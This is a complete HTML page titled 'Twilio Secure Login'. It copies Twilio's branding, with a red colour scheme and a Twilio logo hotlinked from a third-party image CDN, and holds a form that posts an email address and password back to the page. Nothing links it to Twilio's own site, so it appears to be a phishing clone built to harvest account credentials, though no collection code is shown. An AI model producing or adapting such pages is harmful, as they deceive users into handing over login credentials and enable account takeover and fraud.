<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Twilio Secure Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 360px;
    }
    h2 {
      color: #f22f46;
      text-align: center;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #f22f46;
      color: #fff;
      border: none;
      border-radius: 5px;
      font-weight: bold;
    }
    .logo {
      display: block;
      margin: 0 auto 20px;
      width: 120px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img class="logo" src="https://cdn.brandfetch.io/idT7wVo_zL/w/800/h/800/theme/dark/symbol.png?c=1dxbfHSJFAPEGdCLU4o5B" alt="Twilio Logo">
    <h2>Twilio Login</h2>
    <form method="POST">
      <input type="email" name="email" placeholder="Email address" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
